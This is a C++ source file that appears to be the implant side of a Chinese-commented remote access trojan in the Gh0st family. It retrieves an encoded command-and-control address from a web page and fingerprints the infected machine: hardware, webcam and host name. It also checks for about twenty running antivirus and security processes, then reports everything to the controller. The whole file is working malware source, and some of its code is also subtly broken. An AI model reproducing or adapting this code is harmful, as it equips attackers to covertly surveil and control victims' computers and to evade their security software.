
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>

#include "decode.h"
#include "until.h"
#include "install.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")


void SplitLoginInfo(char *lpDecodeString, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
					char **lppszProxyUser, char **lppszProxyPass)
{
	*lppszHost = NULL;
	*lppPort = 0;
	*lppszProxyHost = NULL;
	*lppProxyPort = 0;
	*lppszProxyUser = NULL;
	*lppszProxyPass = NULL;

	bool	bIsProxyUsed = false;
	bool	bIsAuth = false;
	UINT	nSize = lstrlen(lpDecodeString) + 1;
	char	*lpString = new char[nSize];
	memcpy(lpString, lpDecodeString, nSize);
	
	char	*pStart, *pNext, *pEnd;
	*lppszHost = lpString;

	if ((pStart = strchr(lpString, ':')) == NULL)
		return;

	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsProxyUsed = true;
		*pNext = '\0';
	}
	*lppPort = atoi(pStart + 1);
	
	if (!bIsProxyUsed)
		return;

	pNext++;
	*lppszProxyHost = pNext;

	if ((pStart = strchr(pNext, ':')) == NULL)
		return;

	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsAuth = true;
		*pNext = '\0';
	}
	*lppProxyPort = atoi(pStart + 1);
	
	if (!bIsAuth)
		return;
	
	pNext++;
	*lppszProxyUser = pNext;
	if ((pStart = strchr(pNext, ':')) == NULL)
		return;
	*pStart = '\0';
	*lppszProxyPass = pStart + 1;
	delete [] lpString ;//新加入减少内存泄露 
}

bool getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
				  char **lppszProxyUser, char **lppszProxyPass)
{
	if (lpURL == NULL)
		return false;
	char	*pStart, *pEnd;
	char	buffer[2048];
	char	strEncode[1024];

	DWORD	dwBytesRead = 0;
	bool	bRet = false;

	// 没有找到网址，用域名上线
	if (strstr(lpURL, "http://") == NULL && strstr(lpURL, "https://") == NULL)
	{
		SplitLoginInfo(lpURL, lppszHost, lppPort, lppszProxyHost, lppProxyPort, lppszProxyUser, lppszProxyPass);
		return true;
	}

	HINTERNET	hNet;
	HINTERNET	hFile;
	hNet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
	
	if (hNet == NULL)
		return bRet;
	DWORD dwLoginFlags = INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD;
	if (strstr(lpURL, "https://") == lpURL)
		dwLoginFlags |= INTERNET_FLAG_SECURE;
	hFile = InternetOpenUrl(hNet, lpURL, NULL, 0, dwLoginFlags, 0);
	if (hFile == NULL)
		return bRet;
	
	do
	{
		memset(buffer, 0, sizeof(buffer));
		InternetReadFile(hFile, buffer, sizeof(buffer), &dwBytesRead);
		
		if ((pStart = strstr(buffer, "AAAA")) == NULL) 
			continue;
		pStart += 4;
		if ((pEnd = strstr(pStart, "AAAA")) == NULL)
			continue;

		memset(strEncode, 0, sizeof(strEncode));
		memcpy(strEncode, pStart, pEnd - pStart);

		char *lpDecodeString = MyDecode(strEncode);

		SplitLoginInfo(lpDecodeString, lppszHost, lppPort, lppszProxyHost, lppProxyPort, lppszProxyUser, lppszProxyPass);
		bRet = true;
	} while (dwBytesRead > 0);
	
	InternetCloseHandle(hFile);
	InternetCloseHandle(hNet);
	InternetCloseHandle(lpURL);//BUG修改
	return bRet;
}


// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

bool IsWebCam()
{
	bool	bRet = false;
	
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

BOOL GetDriveGeometry(DISK_GEOMETRY *pdg)
{
	HANDLE hDevice;              // handle to the drive to be examined
	BOOL bResult;                // results flag
	DWORD junk;                  // discard results
	
	hDevice = CreateFile("\\\\.\\PHYSICALDRIVE0",  // drive to open
		0,                // no access to the drive
		FILE_SHARE_READ | // share mode
		FILE_SHARE_WRITE,
		NULL,            // default security attributes
		OPEN_EXISTING,    // disposition
		0,                // file attributes
		NULL);            // do not copy file attributes
	
	if (hDevice == INVALID_HANDLE_VALUE) // cannot open the drive
	{
        return (FALSE);
	}
	
	bResult = DeviceIoControl(hDevice,    // device to be queried
        IOCTL_DISK_GET_DRIVE_GEOMETRY,    // operation to perform
		NULL, 0,              // no input buffer
		pdg, sizeof(*pdg),    // output buffer
		&junk,                // # bytes returned
		(LPOVERLAPPED) NULL);  // synchronous I/O
	
	CloseHandle(hDevice);
	return (bResult);
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}

UINT GetGroupName(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	char safe360[] = {'S','O','F','T','W','A','R','E','\\','3','6','0','S','a','f','e','\\','\0'};
	HKEY ck;
	if (ERROR_SUCCESS==RegOpenKeyEx(HKEY_LOCAL_MACHINE,(LPCTSTR)safe360,0,KEY_ALL_ACCESS,&ck)) 
	{
		ReadRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services", "ConnectGroup", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	}
	else
	{
		ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ConnectGroup", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	}
	if (lstrlen(lpBuffer) == 0)
	{
		lstrcpy(lpBuffer,"Default");
	}
	
	return lstrlen(lpBuffer);
}

#include <tchar.h>
///////////////////杀毒显示
char* GetVirus()
{	
	char* AllName = "";
	char* VirusName =  _T("360tray.exe");//360安全卫士
	char* VirusName1 = _T("avp.exe");//卡巴
	char* VirusName2 = _T("KvMonXP.exe");//江民
	char* VirusName3 = _T("RavMonD.exe");//瑞星
	char* VirusName4 = _T("360sd.exe");//360杀毒
	char* VirusName5 = _T("Mcshield.exe");//麦咖啡
	char* VirusName6 = _T("egui.exe");//NOD32
	char* VirusName7 = _T("kxetray.exe");//金山
	char* VirusName8 = _T("knsdtray.exe");//可牛
	char* VirusName9 = _T("TMBMSRV.exe");//趋势
	char* VirusName10 =_T("avcenter.exe");//avira
	char* VirusName11 =_T("ashDisp.exe");//avast
	char* VirusName12 =_T("avguard.exe");//小红伞
	char* VirusName13 =_T("avg.exe");//AVG
	char* VirusName14 =_T("QQPCTray.exe");//QQ管家
	char* VirusName15 =_T("rtvscan.exe");//赛门铁克
	char* VirusName16 =_T("QQ.exe");//QQ
	char* VirusName18 =_T("YY.exe");//YY
	char* VirusName19 =_T("BaiduAnTray.exe");//百度卫士
	char* VirusName20 =_T("FTP.exe");//FTP
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	if (GetProcessID(VirusName)) 
	{
		ZeroMemory( VirusName, sizeof(VirusName) );
		VirusName = _T("360卫士");
		lstrcat( AllName, VirusName ); // 如果找到了进程, 就把名字加到AllName的后面
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName1))
	{	
		ZeroMemory( VirusName1, sizeof(VirusName1) );
		VirusName1 = _T("卡巴");
		lstrcat( AllName, VirusName1 ); 
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName2))
	{	
		ZeroMemory( VirusName2, sizeof(VirusName2) );
		VirusName2 = _T("江民");
		lstrcat( AllName, VirusName2 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName3))
	{	
		ZeroMemory( VirusName3, sizeof(VirusName3) );
		VirusName3 = _T("瑞星");
		lstrcat( AllName, VirusName3 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName4))
	{	
		ZeroMemory( VirusName4, sizeof(VirusName4) );
		VirusName4 = _T("360杀毒");
		lstrcat( AllName, VirusName4 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName5))
	{	
		ZeroMemory( VirusName5, sizeof(VirusName5) );
		VirusName5 = _T("麦咖啡");
		lstrcat( AllName, VirusName5 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName6))
	{	
		ZeroMemory( VirusName6, sizeof(VirusName6) );
		VirusName6 = _T("NOD32");
		lstrcat( AllName, VirusName6 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName7))
	{	
		ZeroMemory( VirusName7, sizeof(VirusName7) );
		VirusName7 = _T("金山");
		lstrcat( AllName, VirusName7 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName8))
	{	
		ZeroMemory( VirusName8, sizeof(VirusName8) );
		VirusName8 = _T("可牛");
		lstrcat( AllName, VirusName8 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName9))
	{	
		ZeroMemory( VirusName9, sizeof(VirusName9) );
		VirusName9 = _T("趋势");
		lstrcat( AllName, VirusName9 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName10))
	{	
		ZeroMemory( VirusName10, sizeof(VirusName10) );
		VirusName10 = _T("avira");
		lstrcat( AllName, VirusName10 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName11))
	{	
		ZeroMemory( VirusName11, sizeof(VirusName11) );
		VirusName11 = _T("avast");
		lstrcat( AllName, VirusName11 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName12))
	{	
		ZeroMemory( VirusName12, sizeof(VirusName12) );
		VirusName12 = _T("小红伞");
		lstrcat( AllName, VirusName12 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName13))
	{	
		ZeroMemory( VirusName13, sizeof(VirusName13) );
		VirusName13 = _T("AVG");
		lstrcat( AllName, VirusName13 );
		lstrcat( AllName, " " );
	}	
	if (GetProcessID(VirusName14))
	{	
		ZeroMemory( VirusName14, sizeof(VirusName14) );
		VirusName14 = _T("QQ管家");
		lstrcat( AllName, VirusName14 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName15))
	{	
		ZeroMemory( VirusName15, sizeof(VirusName15) );
		VirusName15 = _T("赛门铁克");
		lstrcat( AllName, VirusName15 );
		lstrcat( AllName, " " );
	}
	if (GetProcessID(VirusName16))
	{	
		ZeroMemory( VirusName16, sizeof(VirusName16) );
		VirusName16 = _T("QQ");
		lstrcat( AllName, VirusName16);
		lstrcat( AllName, " " );
	}
		if (GetProcessID(VirusName18))
	{	
		ZeroMemory( VirusName18, sizeof(VirusName18) );
		VirusName18 = _T("YY");
		lstrcat( AllName, VirusName18);
		lstrcat( AllName, " " );
	}
		if (GetProcessID(VirusName19))
	{	
		ZeroMemory( VirusName19, sizeof(VirusName19) );
		VirusName19 = _T("百度卫士");
		lstrcat( AllName, VirusName19);
		lstrcat( AllName, " " );
	}
			if (GetProcessID(VirusName20))
	{	
		ZeroMemory( VirusName20, sizeof(VirusName20) );
		VirusName20 = _T("FTP");
		lstrcat( AllName, VirusName20);
		lstrcat( AllName, " " );
	}
	if (strstr(AllName, "  " )  == 0 )
	{	
		lstrcat(AllName , _T(""));
	}
	return AllName;
}

// 声明：真实系统版本获取函数（定义在 SysInfo.cpp）
void GetRealOSVersion(OSVERSIONINFOEX *pInfo);

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	MYLOGIN	LoginInfo;
	memset(&LoginInfo, 0, sizeof(MYLOGIN));
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetRealOSVersion(&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	
	// 主机名
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));
	
	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	
	LoginInfo.dwCPUClockMhz = CPUClockMhz();
	SYSTEM_INFO SysInfo;//用于获取CPU个数的
	GetSystemInfo(&SysInfo);
	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
	LoginInfo.bIsWebCam = IsWebCam();
	
	//硬盘大小
	DISK_GEOMETRY pdg;
	BOOL bResult;
	ULONGLONG DiskSize;
	bResult = GetDriveGeometry(&pdg);
	DiskSize = pdg.Cylinders.QuadPart * (ULONG)pdg.TracksPerCylinder * (ULONG)pdg.SectorsPerTrack * (ULONG)pdg.BytesPerSector;
	LoginInfo.dwDiskSize = DiskSize / (1024 * 1024 * 1024);
	
	// 内存大小
	MEMORYSTATUS   mem_stat;   
	GlobalMemoryStatus(&mem_stat);   
	LoginInfo.dwMemSpace = mem_stat.dwTotalPhys / (1024 * 1024);
	
	//分组
	GetGroupName(NULL, LoginInfo.szGroup, sizeof(LoginInfo.szGroup) );

	if (lstrlen(LoginInfo.szGroup)==0)
		lstrcpy(LoginInfo.szGroup,"Default");
	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	// 杀毒软件
	strcpy(LoginInfo.szAntiVirus, GetVirus());
	
	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(MYLOGIN));
	
	return nRet;
}
